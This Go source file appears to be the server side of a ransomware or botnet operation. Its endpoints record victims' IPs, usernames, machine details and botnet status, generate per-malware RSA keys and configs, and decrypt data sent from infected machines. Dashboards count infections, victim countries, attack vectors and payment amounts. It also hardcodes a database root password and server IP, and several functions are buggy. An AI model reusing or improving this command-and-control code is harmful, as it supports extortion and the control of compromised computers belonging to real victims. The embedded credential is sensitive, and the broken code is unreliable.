package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"database/sql"
	b64 "encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"gopkg.in/matryer/respond.v1"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"text/template"
)

type Malware struct {
	Id            int
	MalwareTypeId int
	Situation     string
}
func check(e error) {
	if e != nil {
		panic(e)
	}
}
type Victim struct{
	Id int
	VictimIp string
	Victim_local_ip string
	Computer_name string
	Username string
	Computer_ram float32
	Computer_cpu string
	Computer_status []byte
	Botnet_status []byte

}

func moveToVar( mid string)  {
	cmd := exec.Command("cp", "/home/live/keys/"+mid+mid+"_rsa_public_key.pub"+" /var/www/html/keys/")
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}
}
func moveToLive( id string)  {
	cmd1 := exec.Command("mkdir", "/home/live/keys/"+id)
	if err := cmd1.Run(); err != nil {
		log.Fatal(err)
	}

	cmd2 := exec.Command("mv", "*_rsa_* /home/live/keys/"+id+"/")
	if err := cmd2.Run(); err != nil {
		log.Fatal(err)
	}
}
func GenerateRSA(id int) {
	// generate key
	privatekey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		fmt.Printf("Cannot generate RSA key\n")
		os.Exit(1)
	}
	publickey := &privatekey.PublicKey

	// dump private key to file
	var privateKeyBytes []byte = x509.MarshalPKCS1PrivateKey(privatekey)
	privateKeyBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privateKeyBytes,
	}
	privatePem, err := os.Create(string(id)+"_rsa_private_key")
	if err != nil {
		fmt.Printf("error when create private.pem: %s \n", err)
		os.Exit(1)
	}
	err = pem.Encode(privatePem, privateKeyBlock)
	if err != nil {
		fmt.Printf("error when encode private pem: %s \n", err)
		os.Exit(1)
	}

	// dump public key to file
	publicKeyBytes, err := x509.MarshalPKIXPublicKey(publickey)
	if err != nil {
		fmt.Printf("error when dumping publickey: %s \n", err)
		os.Exit(1)
	}
	publicKeyBlock := &pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: publicKeyBytes,
	}
	publicPem, err := os.Create(string(id)+"_rsa_public_key.pub")
	if err != nil {
		fmt.Printf("error when create public.pem: %s \n", err)
		os.Exit(1)
	}
	err = pem.Encode(publicPem, publicKeyBlock)
	if err != nil {
		fmt.Printf("error when encode public pem: %s \n", err)
		os.Exit(1)
	}
}

var tmpl = template.Must(template.ParseGlob("form/*"))
func dbConn() (db *sql.DB) {
	dbDriver := "mysql"
	dbUser := "root"
	dbPass := "MB_bpt2a{P5<77Mr?)"
	dbName := "tester"
	whoWherePort:=dbUser+":"+dbPass+"@tcp(138.68.86.190:3306)/"+dbName

	//db, err := sql.Open(dbDriver, dbUser+":"+dbPass+"@/"+dbName)
	db, err := sql.Open(dbDriver, whoWherePort)

	if err != nil {
		panic(err.Error())
	}
	return db
}
func IndexVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Victim ORDER BY id DESC")
	if err != nil {
		panic(err.Error())
	}
	emp := Victim{}
	res := []Victim{}
	for selDB.Next() {
		var id int
		var victimIp string
		var victimLocalIp string
		var computerName string
		var username string
		var computerRam float32
		var computerCpu string
		var computerStatus []byte
		var botnetStatus []byte
		err = selDB.Scan(&id, &victimIp, &victimLocalIp ,&computerName,&username,&computerRam,&computerCpu,&computerStatus,&botnetStatus)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.VictimIp = victimIp
		emp.Victim_local_ip = victimLocalIp
		emp.Computer_name = victimLocalIp
		emp.Username = victimLocalIp
		emp.Computer_ram = computerRam
		emp.Computer_cpu = computerCpu
		emp.Computer_status = computerStatus
		emp.Botnet_status = botnetStatus
		res = append(res, emp)
	}
	_ = tmpl.ExecuteTemplate(w, "IndexVictim", res)
	defer db.Close()
}
func IndexMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC")

	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	res := []Malware{}
	for selDB.Next() {
		var Id int
		var MalwareTypeId int
		var Situation string
		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = Id
		emp.MalwareTypeId = MalwareTypeId
		emp.Situation = Situation
		res = append(res, emp)
	}
	fmt.Println(res)
	w.Header().Set("Content-Type","application/json")
	_ = tmpl.ExecuteTemplate(w, "IndexMalwares", res)
	defer db.Close()
}
func ShowMalware(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	nId := r.URL.Query().Get("id")
	selDB, err := db.Query("SELECT * FROM Malware WHERE id=?", nId)
	if err != nil {
		panic(err.Error())
	}
	emp := Malware{}
	for selDB.Next() {
		var id ,malwareTypeId int
		var situation string
		err = selDB.Scan(&id, &malwareTypeId, &situation)
		if err != nil {
			panic(err.Error())
		}
		emp.Id = id
		emp.MalwareTypeId = malwareTypeId
		emp.Situation = situation
	}
	tmpl.ExecuteTemplate(w, "ShowMalware", emp)
	defer db.Close()
}
func NewVictim(w http.ResponseWriter, r *http.Request) {
	tmpl.ExecuteTemplate(w, "NewVictim", nil)
}
func InsertVictim(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	if r.Method == "POST" {
		id  := r.FormValue("id")
		victimIp  := r.FormValue("victimIp")
		victimLocalIp  := r.FormValue("victimLocalIp")
		computer_name  := r.FormValue("computer_name")
		username  := r.FormValue("username")
		computer_ram  := r.FormValue("computer_ram")
		computer_cpu  := r.FormValue("computer_cpu")
		computer_status  := r.FormValue("computer_status")
		botnet_status  := r.FormValue("botnet_status")
		fmt.Println(id, victimIp,victimLocalIp,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status )
		insForm, err := db.Prepare("INSERT INTO Victim(id, victim_ip,victim_local_ip,computer_name,username,computer_ram,computer_cpu,computer_status,botnet_status ) VALUES(?,?,?,?,?,?,?,?,?)")
		if err != nil {
			panic(err.Error())
		}
		insForm.Exec(id, victimIp, victimLocalIp, computer_name, username, computer_ram, computer_cpu, computer_status, botnet_status)
	}
	defer db.Close()
	http.Redirect(w, r, "/Victims", 301)
}

func getJSON(sqlString string) (string, error) {
	db := dbConn()
	rows, err := db.Query(sqlString)
	if err != nil {
		return "", err
	}
	defer rows.Close()
	columns, err := rows.Columns()
	if err != nil {
		return "", err
	}
	count := len(columns)
	tableData := make([]map[string]interface{}, 0)
	values := make([]interface{}, count)
	valuePtrs := make([]interface{}, count)
	for rows.Next() {
		for i := 0; i < count; i++ {
			valuePtrs[i] = &values[i]
		}
		_ = rows.Scan(valuePtrs...)
		entry := make(map[string]interface{})
		for i, col := range columns {
			var v interface{}
			val := values[i]
			b, ok := val.([]byte)
			if ok {
				v = string(b)
			} else {
				v = val
			}
			entry[col] = v
		}
		tableData = append(tableData, entry)
	}
	jsonData, err := json.Marshal(tableData)
	if err != nil {
		return "", err
	}
	fmt.Println(string(jsonData))
	return string(jsonData), nil
}

func getRequested(sqlReq string,w http.ResponseWriter){
	jsonized ,_ := getJSON(sqlReq)
	fmt.Println(jsonized)
	_ = json.NewEncoder(w).Encode(jsonized)
}

func GetVictimInfo(w http.ResponseWriter , r *http.Request){
	var body string
	var data map[string]interface{}
	err := json.NewDecoder(r.Body).Decode(body)
	check(err)
	json.Unmarshal([]byte(body),&data)
	//fmt.Println(reflect.TypeOf(data))
	//fmt.Println(data)
	//consider the data is fine
	vicId := fmt.Sprintf("%v",data["id"])
	rsaString := fmt.Sprintf("%v",data["info"])
	var encryptedData  = ReadInfoFromRSA(vicId,rsaString)
	fmt.Println(encryptedData)
	// victim info elimizde var şimdi database'e basmak kaldı TODO

}

func ReadInfoFromRSA(vicId string, infocuk string) []byte {

	// Read the private key
	pemData, err := ioutil.ReadFile("home/live/keys/"+vicId+"/"+vicId+"_rsa_private_key")
	if err != nil {
		log.Fatalf("read key file: %s", err)
	}

	// Extract the PEM-encoded data block
	block, _ := pem.Decode(pemData)
	if block == nil {
		log.Fatalf("bad key data: %s", "not PEM-encoded")
	}
	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
		log.Fatalf("unknown key type %q, want %q", got, want)
	}

	// Decode the RSA private key
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		log.Fatalf("bad private key: %s", err)
	}

	var out []byte

	// Decrypt the data
	out, err = rsa.DecryptOAEP(sha1.New(), rand.Reader, priv, []byte(infocuk), []byte(""))
	if err != nil {
		log.Fatalf("decrypt: %s", err)
	}
	return out
}


func CreateConfig(id int, version string){
	idString := strconv.Itoa(id)
	sEncId := b64.StdEncoding.EncodeToString([]byte(idString))
	sEncVer := b64.StdEncoding.EncodeToString([]byte(version))
	fmt.Println(sEncId+"\n"+sEncVer)
	err := ioutil.WriteFile(idString+"_config", []byte(sEncVer+"\n"+sEncId), 0644)


	cmd1 := exec.Command("mv", idString+"_config"+" /var/www/configs/")
	if err := cmd1.Run(); err != nil {
		log.Fatal(err)
	}

	check(err)
}

func GetID(w http.ResponseWriter, r *http.Request) {
	db := dbConn()
	selDB, err := db.Query("SELECT * FROM Malware ORDER BY id DESC LIMIT 1")
	if err != nil {
		panic(err.Error())
	}
	for selDB.Next() {
		var Id int
		var MalwareTypeId int
		var Situation string
		err = selDB.Scan(&Id, &MalwareTypeId, &Situation)
		if err != nil {
			panic(err.Error())
		}
		idString := string(Id+1)
		CreateConfig(Id+1,"v1")
		GenerateRSA(Id+1)
		moveToLive(idString)
		moveToVar(idString)
		//dataenvelope := map[string]interface{}{"code": Id}
		respond.With(w, r, http.StatusOK, Id+1)
	}


}

func CreatedInfectedInfo(w http.ResponseWriter, r *http.Request){
	//created-> malware sayısı
	//infected -> victim sayısı
	db := dbConn()
	selDB, err := db.Query("SELECT id FROM Malware ORDER BY id DESC LIMIT 1")
	if err != nil {
		panic(err.Error())
	}
	var created int
	for selDB.Next(){
		err = selDB.Scan(&created)
		if err != nil {
			panic(err.Error())
		}
	}
	var infected int
	selDB, err = db.Query("SELECT id FROM Victim ORDER BY id DESC LIMIT 1")
	if err != nil {
		panic(err.Error())
	}
	for selDB.Next(){
		err = selDB.Scan(&infected)
		if err != nil {
			panic(err.Error())
		}
	}

	resp := "{\"created\":"+ string(created) + ",\"infected\":"+string(infected)+"}"
	respond.With(w, r, http.StatusOK, resp)

}





func GetCountry(w http.ResponseWriter, r *http.Request){
	jsonized ,_ := getJSON("SELECT country,COUNT(*) as count FROM IPWhois GROUP BY country ORDER BY count DESC ")
	respond.With(w, r, http.StatusOK,jsonized)
}

func GetMoney(w http.ResponseWriter, r *http.Request){
	jsonized ,_ := getJSON("SELECT amount,COUNT(*) as count FROM Money GROUP BY amount ORDER BY count DESC ")
	respond.With(w, r, http.StatusOK,jsonized)

}

func TypeCounter(w http.ResponseWriter, r *http.Request) {
	jsonized ,_ := getJSON("SELECT attack_vector_type,COUNT(*) as count FROM AttackVector GROUP BY attack_vector_type ORDER BY count DESC ")
	respond.With(w, r, http.StatusOK,jsonized)
}
func main() {
	log.Println("Server started on: http://localhost:8080")
	http.HandleFunc("/Malwares", IndexMalware)
	http.HandleFunc("/Victims", IndexVictim)
	http.HandleFunc("/getMalware", ShowMalware)
	http.HandleFunc("/insertVictim", InsertVictim)
	http.HandleFunc("/getid",GetID)
	http.HandleFunc("/mangirlar", GetMoney)
	http.HandleFunc("/bolivar", GetCountry)
	http.HandleFunc("/dashboard/status/country_stat", GetCountry)
	http.HandleFunc("/dashboard/status/createinfect", CreatedInfectedInfo)
	http.HandleFunc("/dashboard/status/typescount", TypeCounter)

	//http.HandleFunc("/edit", Edit)
	http.HandleFunc("/new", NewVictim)

	http.ListenAndServe(":8080", nil)
}



